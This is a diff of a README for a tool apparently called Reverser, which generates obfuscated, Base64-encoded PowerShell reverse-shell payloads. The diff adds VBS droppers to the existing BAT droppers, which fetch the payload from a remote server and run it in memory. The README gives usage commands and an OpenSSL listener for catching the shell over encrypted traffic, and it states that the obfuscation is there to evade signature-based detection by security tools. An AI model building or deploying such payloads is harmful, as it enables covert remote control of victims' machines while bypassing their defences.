@@ -10,6 +10,7 @@
 - **Obfuscation:** Each generated PowerShell script uses randomly selected variable names to avoid signature-based detection by security tools.
 - **Base64 Encoding:** The PowerShell scripts are encoded in Base64 for additional obfuscation.
 - **Batch File Generation:** Create a batch file that downloads and executes the encoded PowerShell script directly from a remote server.
+- **VBS File Generation:** Create a VBS file that downloads and executes the encoded PowerShell script directly from a remote server.
 - **Customizable:** Users can specify the IP address, port, and server URL for downloading the PowerShell script.
 
 ### Prerequisites
@@ -28,13 +29,13 @@ cd Reverser
 
 ## Explain
 
-The tool can generate two types of files, as chosen by the user:
-A PS1 file with obfuscation and Base64 encoding containing a Reverse shell payload.
-A legitimate BAT file that connects to a remote server to download the encoded PS1 file.
+The tool can generate Three types of files, as chosen by the user:
+- A single PS1 file with obfuscation and Base64 encoding containing a Reverse shell payload.
+- An encoded BAT file that connects to a remote server to download and Execute the encoded PS1 file.
+- A VBS file that connects to a remote server to download and Execute the encoded PS1 file.
 
-To create the BAT file, I developed a Python script that acts as a listener for the PS1 file download request. The server can operate with an encryption certificate and supports connections over both HTTP and HTTPS. This ensures that the initial connection between the BAT file and the server for downloading the payload is conducted over an encrypted channel.
+The BAT and VBS files, during their initial request to the server to download the PS1 into memory, are executed over an encrypted channel using a Self-Signed Certificate. After downloading the PS1 file into memory, the BAT and VBS files will decode the script and establish an encrypted communication channel to create the Reverse Shell
 
-The encoded PS1 file will be loaded into memory and establish a connection to another listener, which is set up using OpenSSL.
 
 This way, we can ensure that the communication is encrypted end-to-end.
 
@@ -44,66 +45,43 @@ Creating only a PS1 file (obfuscated and Based64 encoded):
 ```bash
 python3 Reverser.py -ip <Your_IP> -port <Your_PORT> -type ps1
 ```
+![image](https://github.com/user-attachments/assets/7e53d3e9-553a-459f-bf42-287d2c6e1606)
+
 Creating a VBS file with the tool and transferring it to the listener's directory:
 ```bash
 python3 Reverser.py -ip <Your_IP> -port <Your_PORT> -type vbs -server https://<Your_Listener_Server_IP_For_Downloadin_PS1/download/photo/corgi.png.ps1>
 ```
+![image](https://github.com/user-attachments/assets/ad71135d-a456-427c-a0e5-89bc95d0d4cf)
+
 Creating a BAT file with the tool and transferring it to the listener's directory:
 ```bash
 python3 Reverser.py -ip <Your_IP> -port <Your_PORT> -type bat -server https://<Your_Listener_Server_IP_For_Downloadin_PS1/download/photo/corgi.png.ps1>
 ```
-![image](https://github.com/user-attachments/assets/350a0105-c8a3-43f5-8e67-fddb34cf84f8)
+![image](https://github.com/user-attachments/assets/91411dd0-7ef9-42d2-95c8-918fb3ba42c2)
 
 
+-----------------------------
 
-Opening a listener with the OpenSSL server to receive the Reverse shell connection, 
-and opening a listener with our server to handle the initial connection for downloading the PS1 file from the BAT file:
+Opening The listeners:
+
+Opening a listener with the OpenSSL server to receive the Reverse shell connection:
 ```bash
 openssl s_server -accept <Your_PORT> -cert reception.pem -key reception.key -quiet
 ```
+and opening a listener with our server to handle the initial connection for downloading the PS1 file from the BAT file:
 ```bash
 python3 listener.py -https_port <Your_Listener_Server_PORT>
 ```
-![image](https://github.com/user-attachments/assets/b64a4bf1-e801-4a3e-8a0b-eaa1acbd9ff8)
 
 
-
-Running the BAT file on the workstation, the file connects to our listener server over encrypted traffic:
-
-![image](https://github.com/user-attachments/assets/049f45bf-f014-47d8-92ef-4514294745cf)
+All The traffic is encrypted:
+![image](https://github.com/user-attachments/assets/a2f21061-aa9c-425f-b631-0da774b01395)
 
 
+Getting a Reverse Shell:
+![image](https://github.com/user-attachments/assets/eb34ed8a-e98c-4fed-b01d-f2bafdc00726)
 
 
-Receiving a response from the listener server and establishing a Reverse shell from the workstation:
-
-![image](https://github.com/user-attachments/assets/dee0bf16-68f4-4059-9bdf-3d28e859e4c5)
-
-
-
-The encrypted network traffic:
-
-![image](https://github.com/user-attachments/assets/7fa8673f-0d4c-40e5-9449-ef746b6b203f)
-
-
-
-And here is an example for those who want to create an encrypted listener server. 
-The BAT file will connect to the server to download the PS1 file, and you can observe the connection to the server. 
-The Reverse shell operation will then proceed in an encrypted manner:
-![image](https://github.com/user-attachments/assets/77b78ae6-fc92-4fa9-93fa-ab43a9bc5b27)
-
-
-# Update for the tool (25/08/2024):
-1) A change was made in the BAT file
-  The pyaload for downloading the PS1 file currently works with base64 compared to the previous version that was in clear texr:
-
-  ![image](https://github.com/user-attachments/assets/6cebfce2-3ebe-44a5-969c-afca3c7024ce)
-
-2) A bank of variables has been added to streamline the PS1 file signature change:
-
-  ![image](https://github.com/user-attachments/assets/dce15c9a-68e3-4e36-a156-b6d3e1c2bc18)
-
-  ![image](https://github.com/user-attachments/assets/afe01484-cdc3-4b97-849e-0fa59f30f74b)
 
 
 
